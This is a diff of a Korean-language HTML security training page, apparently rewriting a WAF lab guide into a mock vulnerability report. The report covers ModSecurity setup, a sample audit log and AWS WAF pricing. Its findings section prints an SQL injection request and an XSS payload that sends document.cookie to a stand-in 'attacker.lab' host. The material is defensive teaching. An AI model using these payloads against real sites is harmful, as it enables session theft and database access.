@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WAF (Web Application Firewall): 웹 애플리케이션 방화벽 연동 실습</title>
+    <title>WAF (Web Application Firewall): 보안 점검 보고서 및 대응 가이드</title>
     <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -20,11 +20,11 @@
         .text-glow { text-shadow: 0 0 10px rgba(34, 211, 238, 0.4); }
         .section-card { background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(51, 65, 85, 0.5); backdrop-blur: xl; }
         .code-block { font-family: 'Fira Code', monospace; }
+        .annotation-box { background: rgba(30, 41, 59, 0.3); border-left: 2px solid #475569; }
         ::-webkit-scrollbar { width: 8px; }
         ::-webkit-scrollbar-track { background: transparent; }
         ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
         ::-webkit-scrollbar-thumb:hover { background: #0ea5e9; }
-        .price-tag { background: linear-gradient(90deg, #ef4444 0%, #b91c1c 100%); }
     </style>
 </head>
 <body class="antialiased pb-20">
@@ -35,271 +35,323 @@
             <div>
                 <div class="flex items-center gap-2 mb-2">
                     <span class="bg-cyan-500 text-slate-900 px-2 py-0.5 text-[10px] font-black uppercase tracking-widest rounded-sm shadow-[0_0_10px_rgba(34,211,238,0.5)]">Cyber Security Lab</span>
-                    <span class="text-slate-500 font-mono text-[10px]">SEC-WAF-02 | Web Infrastructure</span>
+                    <span class="text-slate-500 font-mono text-[10px]">SEC-WAF-ADV | Infrastructure Protection</span>
                 </div>
                 <h1 class="text-4xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-blue-500 to-indigo-500 tracking-tight leading-tight">
-                    WAF (Web Application Firewall)<br><span class="text-slate-100 text-2xl">웹 애플리케이션 방화벽 연동 실습</span>
+                    WAF (Web Application Firewall)<br><span class="text-slate-100 text-2xl">보안 점검 보고서 및 심층 대응 가이드</span>
                 </h1>
             </div>
             <div class="text-right hidden md:block border-l border-slate-800 pl-6">
-                <div class="bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 px-4 py-2 rounded-xl text-sm font-black font-mono shadow-lg">
-                    STAGED: ACTIVE
+                <div class="bg-red-500/10 text-red-400 border border-red-500/20 px-4 py-2 rounded-xl text-sm font-black font-mono shadow-lg italic">
+                    THREAT LEVEL: CRITICAL
                 </div>
-                <p class="text-[10px] text-slate-500 mt-2 tracking-widest uppercase">System Architect Pro</p>
+                <p class="text-[10px] text-slate-500 mt-2 tracking-widest uppercase">Senior Security Architect</p>
             </div>
         </div>
     </header>
 
     <main class="max-w-6xl mx-auto px-6 py-16 space-y-32">
 
-        <!-- Section 1: 이론 및 아키텍처 도식 -->
+        <!-- Section 1: 기술적 배경 및 아키텍처 -->
         <section>
             <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight uppercase">
-                1. 아키텍처 개요 (Architecture Overview)
+                1. 웹 위협 분석 아키텍처 (Web Threat Analysis Architecture)
             </h2>
             <div class="section-card rounded-3xl p-10 shadow-2xl">
-                <div class="mb-12">
-                    <h3 class="text-xl font-bold text-cyan-400 mb-4">WAF의 정의와 필요성</h3>
-                    <p class="text-slate-300 text-lg leading-relaxed">
-                        <span class="text-white font-bold underline decoration-cyan-500">WAF (Web Application Firewall, 웹 애플리케이션 방화벽)</span>는 일반적인 네트워크 방화벽이 탐지하지 못하는 <span class="text-cyan-400 font-bold">L7 (Application Layer, 애플리케이션 계층)</span>의 비정상적인 트래픽을 분석하고 차단하는 보안 솔루션입니다. 기존 방화벽이 IP 주소나 포트 번호를 기준으로 차단한다면, WAF는 HTTP 패킷의 내용(Payload)을 검사하여 웹 공격을 정교하게 방어합니다.
-                    </p>
-                    <ul class="mt-6 space-y-2 text-slate-400">
-                        <li class="flex items-start gap-2 italic">
-                            <i data-lucide="info" class="w-5 h-5 text-cyan-500 shrink-0"></i>
-                            <span>필요성: 웹 애플리케이션은 항상 외부로 노출되어 있으며, 소스 코드의 취약점을 이용한 공격은 네트워크 방화벽만으로는 방어가 불가능합니다.</span>
-                        </li>
-                        <li class="flex items-start gap-2 italic">
-                            <i data-lucide="shield-check" class="w-5 h-5 text-cyan-500 shrink-0"></i>
-                            <span>보안 목표: OWASP (Open Web Application Security Project, 오픈 소스 웹 애플리케이션 보안 프로젝트) Top 10과 같은 주요 웹 취약점 공격을 실시간으로 차단합니다.</span>
-                        </li>
-                    </ul>
-                </div>
+                <p class="text-slate-300 text-lg mb-10 leading-relaxed">
+                    본 보고서는 기존의 <span class="text-cyan-400 font-bold">L3/L4 Network Firewall (네트워크 방화벽)</span>이 탐지하지 못하는 <span class="text-indigo-400 font-bold">L7 Application Layer (애플리케이션 계층)</span>의 비정상적인 HTTP/HTTPS 트래픽을 정밀 분석합니다. 네트워크 방화벽은 IP와 포트를 제어하지만, <span class="text-white font-bold underline decoration-cyan-500">WAF (Web Application Firewall, 웹 애플리케이션 방화벽)</span>는 데이터 본체인 <span class="text-cyan-400">Payload (페이로드, 데이터 본체)</span>를 실시간으로 전수 검사하여 웹 취약점 공격을 원천 차단하는 핵심 방어 체계입니다.
+                </p>
 
                 <!-- 도식화 인포그래픽 영역 -->
                 <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-8 shadow-inner">
-                    <h4 class="text-center font-bold text-slate-400 mb-10 text-xs tracking-widest uppercase">
-                        [도식: WAF 트래픽 검사 아키텍처]
+                    <h4 class="text-center font-bold text-slate-400 mb-8 text-xs tracking-widest uppercase">
+                        [도식: L4 Firewall vs L7 WAF 검사 심도 비교]
                     </h4>
-                    <div class="flex flex-col md:flex-row items-center justify-between gap-8">
-                        <!-- Component A: Client -->
-                        <div class="flex-1 w-full text-center p-8 bg-slate-800 rounded-xl border border-slate-700 shadow-lg group hover:border-cyan-500 transition-all">
-                            <i data-lucide="users" class="w-12 h-12 text-slate-400 mx-auto mb-4 group-hover:text-cyan-400"></i>
-                            <div class="font-black text-slate-100 text-sm">External Users<br>(외부 사용자/공격자)</div>
+                    <div class="flex flex-col md:flex-row items-stretch justify-between gap-6">
+                        <!-- Network FW -->
+                        <div class="flex-1 p-6 bg-slate-800 rounded-xl border border-slate-700">
+                            <div class="text-red-400 mb-4 flex items-center gap-2"><i data-lucide="shield-off"></i> <span class="text-[10px] font-black uppercase">Network FW</span></div>
+                            <div class="space-y-2">
+                                <div class="h-2 w-full bg-red-500/20 rounded-full overflow-hidden"><div class="h-full bg-red-500 w-[40%]"></div></div>
+                                <p class="text-[10px] text-slate-500">IP/Port Filter Only</p>
+                                <div class="mt-4 p-2 bg-slate-900 rounded text-[10px] text-red-300 font-mono italic">
+                                    ALLOW TCP/80 FROM ANY
+                                </div>
+                            </div>
                         </div>
-                        
-                        <!-- Arrow 1 -->
-                        <div class="flex flex-col items-center">
-                            <div class="text-[10px] text-slate-500 font-mono mb-2">HTTP(S) Request</div>
-                            <i data-lucide="chevrons-right" class="w-8 h-8 text-cyan-500 rotate-90 md:rotate-0 animate-pulse"></i>
-                        </div>
-
-                        <!-- Component B: WAF -->
-                        <div class="flex-1 w-full text-center p-8 bg-cyan-950/30 rounded-xl border border-cyan-500 shadow-[0_0_20px_rgba(34,211,238,0.2)]">
-                            <i data-lucide="shield-alert" class="w-12 h-12 text-cyan-400 mx-auto mb-4"></i>
-                            <div class="font-black text-cyan-100 text-sm italic underline">WAF (L7 Inspection)</div>
-                            <div class="text-[10px] text-cyan-500 mt-2 font-mono uppercase tracking-tighter">Payload Analysis</div>
-                        </div>
-
-                        <!-- Arrow 2 -->
-                        <div class="flex flex-col items-center">
-                            <div class="text-[10px] text-green-500 font-mono mb-2">Clean Traffic</div>
-                            <i data-lucide="chevrons-right" class="w-8 h-8 text-green-500 rotate-90 md:rotate-0"></i>
-                        </div>
-
-                        <!-- Component C: Web Server -->
-                        <div class="flex-1 w-full text-center p-8 bg-slate-800 rounded-xl border border-slate-700 shadow-lg">
-                            <i data-lucide="server" class="w-12 h-12 text-blue-400 mx-auto mb-4"></i>
-                            <div class="font-black text-slate-100 text-sm">Web Application<br>(Server/Database)</div>
+                        <!-- Arrow -->
+                        <div class="flex items-center justify-center"><i data-lucide="chevrons-right" class="text-slate-700 hidden md:block"></i></div>
+                        <!-- WAF -->
+                        <div class="flex-1 p-6 bg-cyan-950/20 rounded-xl border border-cyan-500/50 shadow-[0_0_15px_rgba(34,211,238,0.1)]">
+                            <div class="text-cyan-400 mb-4 flex items-center gap-2"><i data-lucide="shield-check"></i> <span class="text-[10px] font-black uppercase">Web Application Firewall</span></div>
+                            <div class="space-y-2">
+                                <div class="h-2 w-full bg-cyan-500/20 rounded-full overflow-hidden"><div class="h-full bg-cyan-500 w-[95%]"></div></div>
+                                <p class="text-[10px] text-slate-500">Deep Packet Inspection (DPI)</p>
+                                <div class="mt-4 p-2 bg-slate-900 rounded text-[10px] text-cyan-300 font-mono italic">
+                                    DENY IF Payload CONTAINS 'OR 1=1'
+                                </div>
+                            </div>
                         </div>
                     </div>
-                    <div class="mt-8 p-4 bg-slate-900 rounded-lg border border-slate-800 text-xs text-slate-500 text-center italic">
-                        "Payload (페이로드, 데이터 본체)는 전송되는 데이터 중 실제 공격 코드가 포함될 수 있는 부분입니다. WAF는 이 페이로드를 하나하나 검사하는 '세밀한 검문소' 역할을 수행합니다."
+                </div>
+
+                <!-- 상세 주석 (Section 1) -->
+                <div class="annotation-box rounded-xl p-6 mt-8">
+                    <div class="text-xs text-slate-400 leading-relaxed">
+                        <ul class="list-disc pl-4 space-y-2">
+                            <li><strong>L7 (Application Layer, 애플리케이션 계층):</strong> OSI 7계층의 최상위 계층으로 HTTP, HTTPS, FTP 등 최종 사용자 서비스가 동작하는 영역입니다.</li>
+                            <li><strong>DPI (Deep Packet Inspection, 심층 패킷 검사):</strong> 패킷의 헤더뿐만 아니라 데이터 본체(Payload)까지 검사하여 숨겨진 악성 코드를 찾아내는 기술입니다.</li>
+                        </ul>
                     </div>
                 </div>
             </div>
         </section>
 
-        <!-- Section 2: 실습 구성 요소 -->
+        <!-- Section 2: 보안 취약점 점검 결과 보고 -->
         <section>
-            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight uppercase">
-                2. 주요 탐지 및 차단 패턴 (Detection Patterns)
+            <h2 class="text-2xl font-black border-l-4 border-red-500 pl-4 text-slate-100 mb-8 tracking-tight uppercase">
+                2. 취약점 점검 결과 보고 (Vulnerability Scan Report)
             </h2>
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
-                <!-- SQL Injection -->
-                <div class="section-card rounded-3xl p-8 border-red-900/30 shadow-xl relative overflow-hidden group hover:scale-[1.02] transition-transform">
-                    <div class="absolute top-0 right-0 bg-red-600 text-white text-[10px] font-black px-4 py-1 rounded-bl-xl uppercase tracking-tighter font-mono">CRITICAL</div>
-                    <h3 class="text-xl font-bold text-slate-100 mb-6 flex items-center gap-3">
-                        <i data-lucide="database-zap" class="w-6 h-6 text-red-400"></i> SQL Injection
+            <div class="section-card rounded-3xl p-10 shadow-2xl">
+                <div class="bg-red-500/5 border border-red-900/30 rounded-2xl p-8 mb-10">
+                    <h3 class="text-red-400 font-black mb-6 flex items-center gap-2">
+                        <i data-lucide="alert-triangle"></i> 검 탐지 요약 (Scan Summary)
                     </h3>
-                    <p class="text-xs text-slate-400 mb-4">(SQL 인젝션, 데이터베이스 명령 삽입)</p>
-                    <p class="text-sm text-slate-300 leading-relaxed">
-                        입력창에 SQL 구문을 삽입하여 데이터베이스 정보를 무단으로 조회하거나 변조하는 공격입니다.
-                    </p>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8 text-sm">
+                        <div class="space-y-4">
+                            <p class="text-slate-400">대상 도메인: <span class="text-slate-100 font-mono">secure-api.internal.lab</span></p>
+                            <p class="text-slate-400">점검 도구: <span class="text-slate-100">OWASP ZAP / Burp Suite Professional</span></p>
+                        </div>
+                        <div class="flex gap-4">
+                            <div class="flex-1 text-center bg-red-950/30 p-4 rounded-xl border border-red-900/50">
+                                <div class="text-2xl font-black text-red-500">03</div>
+                                <div class="text-[10px] uppercase text-slate-500">Critical</div>
+                            </div>
+                            <div class="flex-1 text-center bg-orange-950/30 p-4 rounded-xl border border-orange-900/50">
+                                <div class="text-2xl font-black text-orange-500">12</div>
+                                <div class="text-[10px] uppercase text-slate-500">Medium</div>
+                            </div>
+                        </div>
+                    </div>
                 </div>
 
-                <!-- XSS -->
-                <div class="section-card rounded-3xl p-8 border-orange-900/30 shadow-xl relative overflow-hidden group hover:scale-[1.02] transition-transform">
-                    <div class="absolute top-0 right-0 bg-orange-600 text-white text-[10px] font-black px-4 py-1 rounded-bl-xl uppercase tracking-tighter font-mono">HIGH</div>
-                    <h3 class="text-xl font-bold text-slate-100 mb-6 flex items-center gap-3">
-                        <i data-lucide="code-2" class="w-6 h-6 text-orange-400"></i> XSS
-                    </h3>
-                    <p class="text-xs text-slate-400 mb-4">(Cross-Site Scripting, 교차 사이트 스크립팅)</p>
-                    <p class="text-sm text-slate-300 leading-relaxed">
-                        악성 스크립트를 웹 페이지에 삽입하여 사용자의 세션 쿠키를 탈취하는 공격입니다.
-                    </p>
+                <div class="space-y-12">
+                    <!-- Vulnerability Case 1 -->
+                    <div class="border-b border-slate-800 pb-12">
+                        <h4 class="text-lg font-bold text-slate-100 mb-4 flex justify-between">
+                            <span>#1. SQL Injection (SQL 인젝션)</span>
+                            <span class="text-red-500 text-xs font-mono">[CVE-2024-XXXXX]</span>
+                        </h4>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                            <div class="terminal-bg p-6 rounded-xl">
+                                <p class="text-[10px] text-slate-500 mb-2 uppercase font-black tracking-widest italic">Attacker Payload (공격 페이로드)</p>
+                                <code class="text-xs text-red-400 break-all leading-relaxed">
+                                    GET /user/profile?id=101' OR 1=1 -- - HTTP/1.1<br>
+                                    Host: victim-server.lab
+                                </code>
+                            </div>
+                            <div class="bg-slate-900/50 p-6 rounded-xl border border-slate-800">
+                                <p class="text-[10px] text-slate-500 mb-2 uppercase font-black tracking-widest italic">Result Analysis (결과 분석)</p>
+                                <p class="text-xs text-slate-300 leading-relaxed">
+                                    인증을 우회하여 전체 사용자 테이블 정보를 탈취할 수 있음. <br>
+                                    <span class="text-red-400 font-bold underline">위험도: 치명적 (Critical)</span>
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Vulnerability Case 2 -->
+                    <div>
+                        <h4 class="text-lg font-bold text-slate-100 mb-4 flex justify-between">
+                            <span>#2. Reflected XSS (반사형 XSS)</span>
+                            <span class="text-orange-500 text-xs font-mono">[OWASP-A03]</span>
+                        </h4>
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                            <div class="terminal-bg p-6 rounded-xl">
+                                <p class="text-[10px] text-slate-500 mb-2 uppercase font-black tracking-widest italic">Attacker Payload (공격 페이로드)</p>
+                                <code class="text-xs text-orange-400 break-all leading-relaxed">
+                                    &lt;script&gt;document.location='http://attacker.lab/steal?cookie='+document.cookie&lt;/script&gt;
+                                </code>
+                            </div>
+                            <div class="bg-slate-900/50 p-6 rounded-xl border border-slate-800">
+                                <p class="text-[10px] text-slate-500 mb-2 uppercase font-black tracking-widest italic">Result Analysis (결과 분석)</p>
+                                <p class="text-xs text-slate-300 leading-relaxed">
+                                    사용자의 세션 쿠키를 탈취하여 계정 탈취(Account Takeover)가 가능함. <br>
+                                    <span class="text-orange-400 font-bold underline">위험도: 높음 (High)</span>
+                                </p>
+                            </div>
+                        </div>
+                    </div>
                 </div>
 
-                <!-- Path Traversal -->
-                <div class="section-card rounded-3xl p-8 border-yellow-900/30 shadow-xl relative overflow-hidden group hover:scale-[1.02] transition-transform">
-                    <div class="absolute top-0 right-0 bg-yellow-600 text-white text-[10px] font-black px-4 py-1 rounded-bl-xl uppercase tracking-tighter font-mono">MEDIUM</div>
-                    <h3 class="text-xl font-bold text-slate-100 mb-6 flex items-center gap-3">
-                        <i data-lucide="folder-search" class="w-6 h-6 text-yellow-400"></i> Path Traversal
-                    </h3>
-                    <p class="text-xs text-slate-400 mb-4">(경로 탐색, 디렉터리 접근 공격)</p>
-                    <p class="text-sm text-slate-300 leading-relaxed">
-                        `../` 와 같은 상대 경로를 이용하여 서버의 민감한 시스템 파일에 접근하는 공격입니다.
-                    </p>
+                <!-- 상세 주석 (Section 2) -->
+                <div class="annotation-box rounded-xl p-6 mt-8">
+                    <div class="text-xs text-slate-400 leading-relaxed">
+                        <ul class="list-disc pl-4 space-y-2">
+                            <li><strong>CVE (Common Vulnerabilities and Exposures, 알려진 취약점 목록):</strong> 보안 취약점을 식별하기 위해 부여된 고유 식별 번호입니다.</li>
+                            <li><strong>Account Takeover (계정 탈취):</strong> 공격자가 타인의 인증 정보를 도용하여 불법적으로 계정 권한을 획득하는 행위입니다.</li>
+                        </ul>
+                    </div>
                 </div>
             </div>
         </section>
 
-        <!-- Section 3: 명령어 및 절차 -->
+        <!-- Section 3: WAF 탐지 로그 분석 -->
         <section>
             <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight uppercase">
-                3. ModSecurity 오픈소스 WAF 연동 (Implementation)
+                3. 침해 사고 분석 로그 (WAF Detection Logs)
             </h2>
-            <div class="section-card rounded-3xl p-10 shadow-2xl space-y-12">
-                <p class="text-slate-300">
-                    호스트 기반 WAF인 <span class="text-white font-bold italic">ModSecurity</span>를 Nginx나 Apache에 연동하여 서버 자체적인 방어력을 높일 수 있습니다.
+            <div class="section-card rounded-3xl p-10 shadow-2xl">
+                <p class="text-slate-300 text-sm mb-8 italic">
+                    ModSecurity(Nginx 연동)에서 실제 공격을 탐지했을 때의 로데이터(Raw Data) 로그 형식입니다.
                 </p>
 
-                <!-- Step Block -->
-                <div class="space-y-4">
-                    <div class="flex items-center gap-3">
-                        <span class="bg-cyan-500 text-slate-900 w-6 h-6 rounded-full flex items-center justify-center text-[10px] font-black italic">STEP 01</span>
-                        <h3 class="text-lg font-bold text-slate-100 tracking-tight">커넥터 및 라이브러리 설치</h3>
+                <div class="terminal-bg rounded-2xl p-8 font-mono text-xs overflow-x-auto">
+                    <div class="flex items-center gap-2 mb-6 border-b border-slate-800 pb-4">
+                        <div class="w-3 h-3 rounded-full bg-red-500"></div>
+                        <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+                        <div class="w-3 h-3 rounded-full bg-green-500"></div>
+                        <span class="ml-4 text-slate-600 tracking-widest font-black uppercase">/var/log/nginx/modsec_audit.log</span>
                     </div>
-                    <div class="pl-10">
-                        <p class="text-sm text-slate-500 mb-4">Nginx용 ModSecurity 커넥터를 Ubuntu 시스템에 설치합니다.</p>
-                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative">
-                            <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black">Console</div>
-                            <div class="text-slate-200">$ <span class="text-cyan-400">sudo apt update</span></div>
-                            <div class="text-slate-200">$ <span class="text-cyan-400">sudo apt install libnginx-mod-http-modsecurity -y</span></div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Step Block -->
-                <div class="space-y-4">
-                    <div class="flex items-center gap-3">
-                        <span class="bg-cyan-500 text-slate-900 w-6 h-6 rounded-full flex items-center justify-center text-[10px] font-black italic">STEP 02</span>
-                        <h3 class="text-lg font-bold text-slate-100 tracking-tight">Nginx 설정 파일 수정 (Activation)</h3>
-                    </div>
-                    <div class="pl-10">
-                        <p class="text-sm text-slate-500 mb-4">nginx.conf 내 http { ... } 또는 server { ... } 블록에 규칙을 로드합니다.</p>
-                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative bg-slate-950/50">
-                            <div class="absolute top-4 right-4 text-slate-600 text-[10px] uppercase font-black">Config File</div>
-                            <div class="text-cyan-500 font-bold">modsecurity on;</div>
-                            <div class="text-cyan-500 font-bold">modsecurity_rules_file /etc/nginx/modsec/main.conf;</div>
-                        </div>
+                    <div class="space-y-2 text-slate-300">
+                        <div class="text-cyan-600">[2024-03-27 14:32:01] <span class="text-red-400">[CRITICAL]</span> TRANSACTION ID: 1711517521</div>
+                        <div class="pl-4 text-slate-500">--- Message: <span class="text-slate-200">SQL Injection Attack Detected via libmodsecurity</span></div>
+                        <div class="pl-4 text-slate-500">--- Rule ID: <span class="text-slate-200">942100 (OWASP CRS)</span></div>
+                        <div class="pl-4 text-slate-500">--- Client IP: <span class="text-slate-200">192.168.45.10 (Host PC)</span></div>
+                        <div class="pl-4 text-slate-500">--- Requested URL: <span class="text-red-300">/api/v1/auth?user=' OR '1'='1'</span></div>
+                        <div class="pl-4 text-slate-500">--- Action: <span class="text-red-500 font-bold italic">Intervention - Status 403 (Forbidden)</span></div>
+                        <div class="mt-4 text-slate-600 italic"># 분석: 공격자의 패턴이 SQL Injection 코어 규칙에 매칭되어 즉시 403 응답으로 차단됨.</div>
                     </div>
                 </div>
 
-                <!-- Step Block -->
-                <div class="space-y-4">
-                    <div class="flex items-center gap-3">
-                        <span class="bg-cyan-500 text-slate-900 w-6 h-6 rounded-full flex items-center justify-center text-[10px] font-black italic">STEP 03</span>
-                        <h3 class="text-lg font-bold text-slate-100 tracking-tight">서비스 재시작 및 적용</h3>
-                    </div>
-                    <div class="pl-10">
-                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner relative">
-                            <div class="text-slate-200">$ <span class="text-cyan-400">sudo systemctl restart nginx</span></div>
-                        </div>
-                        <div class="mt-4 p-4 bg-slate-900/50 border-l-4 border-cyan-500 rounded-r-lg">
-                            <p class="text-xs text-slate-400 leading-relaxed italic">
-                                "ModSecurity (모드시큐리티)는 전 세계적으로 가장 많이 사용되는 오픈소스 WAF 엔진으로, 정교한 규칙 세트인 OWASP CRS (Core Rule Set)를 적용하여 높은 보안 수준을 유지할 수 있습니다."
-                            </p>
-                        </div>
+                <!-- 상세 주석 (Section 3) -->
+                <div class="annotation-box rounded-xl p-6 mt-8">
+                    <div class="text-xs text-slate-400 leading-relaxed">
+                        <ul class="list-disc pl-4 space-y-2">
+                            <li><strong>OWASP CRS (Core Rule Set, 핵심 규칙 집합):</strong> 전 세계 보안 전문가들이 공동으로 관리하는 ModSecurity용 범용 공격 탐지 규칙 라이브러리입니다.</li>
+                            <li><strong>Intervention (중재/개입):</strong> WAF 엔진이 비정상 트래픽을 발견하고 요청을 중단시키거나 차단 페이지로 유도하는 동작입니다.</li>
+                        </ul>
                     </div>
                 </div>
             </div>
         </section>
 
-        <!-- Section 4: 전문가 분석 -->
+        <!-- Section 4: 보안 대응 가이드 (Implementation) -->
         <section>
             <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight uppercase">
-                4. AWS WAF 활용 및 과금 (Managed Service & Pricing)
+                4. 실전 보안 대응 가이드 (Security Hardening Guide)
+            </h2>
+            <div class="section-card rounded-3xl p-10 shadow-2xl space-y-16">
+                
+                <!-- Remediation 1 -->
+                <div class="space-y-6">
+                    <div class="flex items-center gap-3">
+                        <span class="bg-cyan-500 text-slate-900 w-8 h-8 rounded-full flex items-center justify-center text-xs font-black">01</span>
+                        <h3 class="text-xl font-bold text-slate-100 italic">ModSecurity Nginx 엔진 활성화</h3>
+                    </div>
+                    <div class="pl-12">
+                        <p class="text-sm text-slate-400 mb-6 leading-relaxed">
+                            기존에 설치된 Nginx를 삭제하지 않고 모듈화된 <span class="text-cyan-400">libmodsecurity</span>를 연동하여 트래픽 필터링을 활성화합니다.
+                        </p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm relative">
+                            <div class="absolute top-4 right-4 text-slate-700 text-[10px] font-black uppercase">Configuration</div>
+                            <div class="text-slate-500"># /etc/nginx/nginx.conf</div>
+                            <div class="text-slate-200 mt-2">load_module modules/ngx_http_modsecurity_module.so;</div>
+                            <div class="text-slate-200 mt-4">http {</div>
+                            <div class="text-cyan-400 pl-4">modsecurity on;</div>
+                            <div class="text-cyan-400 pl-4">modsecurity_rules_file /etc/nginx/modsec/main.conf;</div>
+                            <div class="text-slate-200">}</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Remediation 2 -->
+                <div class="space-y-6">
+                    <div class="flex items-center gap-3">
+                        <span class="bg-cyan-500 text-slate-900 w-8 h-8 rounded-full flex items-center justify-center text-xs font-black">02</span>
+                        <h3 class="text-xl font-bold text-slate-100 italic">OWASP CRS 규칙 배포 및 업데이트</h3>
+                    </div>
+                    <div class="pl-12">
+                        <p class="text-sm text-slate-400 mb-6 leading-relaxed">
+                            최신 웹 위협에 대응하기 위해 주기적으로 <span class="text-indigo-400 font-bold underline">CRS v4.0 (최신 버전)</span>을 다운로드하여 적용합니다.
+                        </p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm relative">
+                            <div class="text-slate-200">$ <span class="text-cyan-400">git clone https://github.com/coreruleset/coreruleset.git /etc/nginx/modsec/crs</span></div>
+                            <div class="text-slate-200 mt-2">$ <span class="text-cyan-400">cp crs/crs-setup.conf.example crs/crs-setup.conf</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 상세 주석 (Section 4) -->
+                <div class="annotation-box rounded-xl p-6 mt-8">
+                    <div class="text-xs text-slate-400 leading-relaxed">
+                        <ul class="list-disc pl-4 space-y-2">
+                            <li><strong>Security Hardening (보안 강화/경량화):</strong> 시스템의 불필요한 요소를 제거하고 보안 설정을 최적화하여 공격 가능 표면을 최소화하는 작업입니다.</li>
+                            <li><strong>vX.X (Version):</strong> 소프트웨어의 배포 단계를 나타내는 번호로, 보안 모듈의 경우 최신 버전일수록 방어 가능한 패턴이 많습니다.</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 5: AWS WAF 클라우드 전용 전략 -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight uppercase">
+                5. 클라우드 전용 WAF 전략 (AWS WAF Specialization)
             </h2>
             <div class="bg-slate-900/40 border border-slate-800 rounded-3xl p-10 shadow-2xl space-y-12">
                 <p class="text-slate-300">
-                    클라우드 환경에서는 별도의 서버 설치 없이 <span class="text-cyan-400 font-bold">AWS WAF</span>를 <span class="text-blue-400 font-bold italic">ALB (Application Load Balancer)</span> 또는 <span class="text-indigo-400 font-bold italic">CloudFront</span>에 직접 연결하여 관리할 수 있습니다.
+                    인프라 관리 부담을 줄이기 위해 AWS 관리형 서비스를 이용할 경우의 <span class="text-red-400 font-black">과금 정책</span> 및 <span class="text-cyan-400 font-black">실행 전략</span>입니다.
                 </p>
 
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
-                    <div class="bg-slate-800/50 p-6 rounded-2xl border border-slate-700">
-                        <div class="text-cyan-400 mb-4"><i data-lucide="library" class="w-8 h-8"></i></div>
-                        <h4 class="font-bold text-slate-100 mb-2">Managed Rule Groups (관리형 규칙 그룹)</h4>
-                        <p class="text-xs text-slate-400 leading-relaxed">AWS 보안 전문가가 미리 작성한 규칙(예: SQLi 방어, 봇 제어)을 클릭 한 번으로 적용할 수 있습니다.</p>
+                    <!-- Managed Rule -->
+                    <div class="p-8 bg-slate-800/50 rounded-2xl border border-slate-700 hover:border-cyan-500/50 transition-colors">
+                        <div class="text-cyan-400 mb-4"><i data-lucide="cloud-lightning" class="w-8 h-8"></i></div>
+                        <h4 class="font-bold text-slate-100 mb-4 uppercase text-sm tracking-widest">Managed Rule Groups</h4>
+                        <p class="text-xs text-slate-400 leading-relaxed">
+                            AWS 전문가가 관리하는 <span class="text-white">Core Rule Set (코어 규칙 집합)</span>을 즉시 활성화하여 제로데이 공격에 선제 대응합니다.
+                        </p>
                     </div>
-                    <div class="bg-slate-800/50 p-6 rounded-2xl border border-slate-700">
-                        <div class="text-indigo-400 mb-4"><i data-lucide="list-checks" class="w-8 h-8"></i></div>
-                        <h4 class="font-bold text-slate-100 mb-2">Web ACL (웹 접근 제어 목록)</h4>
-                        <p class="text-xs text-slate-400 leading-relaxed">여러 규칙을 묶어 특정 리소스에 적용하는 최상위 보안 설정 단위입니다.</p>
-                    </div>
-                </div>
-
-                <!-- Pricing Table -->
-                <div class="border border-red-900/50 bg-red-950/10 rounded-3xl p-8 overflow-hidden">
-                    <div class="flex items-center gap-3 mb-6">
-                        <i data-lucide="credit-card" class="text-red-500 w-6 h-6"></i>
-                        <h4 class="text-xl font-black text-red-400 uppercase tracking-widest italic underline">Pricing Policy (과금 안내)</h4>
-                    </div>
-                    <div class="space-y-4">
-                        <div class="flex justify-between items-center p-3 border-b border-red-900/30">
-                            <span class="text-slate-300 font-bold">Web ACL</span>
-                            <span class="text-red-400 font-mono font-black">월 $5.00 / 개당</span>
-                        </div>
-                        <div class="flex justify-between items-center p-3 border-b border-red-900/30">
-                            <span class="text-slate-300 font-bold">Rule</span>
-                            <span class="text-red-400 font-mono font-black">월 $1.00 / 개당</span>
-                        </div>
-                        <div class="flex justify-between items-center p-3 border-b border-red-900/30">
-                            <span class="text-slate-300 font-bold">Web Request</span>
-                            <span class="text-red-400 font-mono font-black">$0.60 / 100만 건당</span>
-                        </div>
-                        <p class="text-[10px] text-red-500/70 pt-4 italic">
-                            * Managed Rules: AWS 또는 마켓플레이스 판매자가 제공하는 유료 규칙 사용 시 추가 비용이 발생할 수 있습니다.
+                    <!-- Web ACL -->
+                    <div class="p-8 bg-slate-800/50 rounded-2xl border border-slate-700 hover:border-indigo-500/50 transition-colors">
